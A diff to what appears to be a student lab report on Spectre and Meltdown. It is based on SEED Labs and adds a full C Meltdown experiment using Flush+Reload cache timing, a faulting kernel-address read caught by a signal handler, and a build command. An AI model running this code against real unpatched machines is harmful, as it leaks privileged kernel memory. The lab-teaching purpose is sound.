@@ -8,7 +8,7 @@ This report comprehensively examines Spectre and Meltdown vulnerabilities. Our g
 
 ## Requirements
 > * Requires a machine that is susceptible to Meltdown & Spectre Attacks, prior to OS patch. A VM is provided **[here](https://seed.nyc3.cdn.digitaloceanspaces.com/SEEDUbuntu-16.04-32bit.zip)**
-> * **Intel-based System**, this attack won't work on AMD Computers
+> * **Intel-based System** For Meltdown, Otherwise, this attack won't work on AMD Computers
 > * Attack code (We used the code from **[SEEDLabs Security](https://seedsecuritylabs.org/Labs_16.04/System/Meltdown_Attack/files/Meltdown_Attack.zip)**)
 
 
@@ -368,7 +368,8 @@ $ sudo insmod MeltdownKernel.ko
 $ dmesg | grep 'secret data address'
 ```
 
-Output:
+The secret data was cached into the address: **0xf9de1000**
+**Terminal Output:**
 ![Image3](https://cdn.discordapp.com/attachments/1131246972372791429/1161265381206405170/image.png?ex=6537abaa&is=652536aa&hm=9e9d5df99b8fd3ff86d32e5559e3c8bc287dea0647a02d987a570629938f82f0&)
 
 
@@ -377,3 +378,122 @@ Output:
 
 
 #### Step 4: Out-of-Order Execution
+
+
+```c
+#include <stdio.h>
+#include <stdint.h>
+#include <unistd.h>
+#include <string.h>
+#include <signal.h>
+#include <setjmp.h>
+#include <fcntl.h>
+#include <emmintrin.h>
+#include <x86intrin.h>
+
+/*********************** Flush + Reload ************************/
+uint8_t array[256*4096];
+/* cache hit time threshold assumed*/
+#define CACHE_HIT_THRESHOLD (80)
+#define DELTA 1024
+
+void flushSideChannel()
+{
+  int i;
+
+  // Write to array to bring it to RAM to prevent Copy-on-write
+  for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;
+
+  //flush the values of the array from cache
+  for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 + DELTA]);
+}
+
+void reloadSideChannel() 
+{
+  int junk=0;
+  register uint64_t time1, time2;
+  volatile uint8_t *addr;
+  int i;
+  for(i = 0; i < 256; i++){
+     addr = &array[i*4096 + DELTA];
+     time1 = __rdtscp(&junk);
+     junk = *addr;
+     time2 = __rdtscp(&junk) - time1;
+     if (time2 <= CACHE_HIT_THRESHOLD){
+         printf("array[%d*4096 + %d] is in cache.\n",i,DELTA);
+         printf("The Secret = %d.\n",i);
+     }
+  }	
+}
+/*********************** Flush + Reload ************************/
+
+void meltdown(unsigned long kernel_data_addr)
+{
+  char kernel_data = 0;
+   
+  // The following statement will cause an exception
+  kernel_data = *(char*)kernel_data_addr;     
+  array[7 * 4096 + DELTA] += 1;          
+}
+
+void meltdown_asm(unsigned long kernel_data_addr)
+{
+   char kernel_data = 0;
+   
+   // Give eax register something to do
+   asm volatile(
+       ".rept 400;"                
+       "add $0x141, %%eax;"
+       ".endr;"                    
+    
+       :
+       :
+       : "eax"
+   ); 
+    
+   // The following statement will cause an exception
+   kernel_data = *(char*)kernel_data_addr;  
+   array[kernel_data * 4096 + DELTA] += 1;           
+}
+
+// signal handler
+static sigjmp_buf jbuf;
+static void catch_segv()
+{
+  siglongjmp(jbuf, 1);
+}
+
+int main()
+{
+  // Register a signal handler
+  signal(SIGSEGV, catch_segv);
+
+  // FLUSH the probing array
+  flushSideChannel();
+    
+  if (sigsetjmp(jbuf, 1) == 0) {
+      meltdown(0xfb61b000);                
+  }
+  else {
+      printf("Memory access violation!\n");
+  }
+
+  // RELOAD the probing array
+  reloadSideChannel();                     
+  return 0;
+}
+```
+
+
+```shell
+gcc -march=native MeltdownExperiment.c -o MeltdownExperiment 
+```
+
+
+**Explanation**
+During the **Out-of-Order execution**, the referenced memory is fetched into a register and is also stored in the cache. If the **OoO** Execution has to be discarded, then the cache caused by such execution should also be discarded, which doesn't happen in most CPUs.
+**Output:**
+![Image4](https://cdn.discordapp.com/attachments/1131246972372791429/1161292722867535922/image.png?ex=6537c520&is=65255020&hm=f0bb3734dfc177535573451df0112f2f21c0deb925251c24e424b8104ab0481b&)
+
+
+
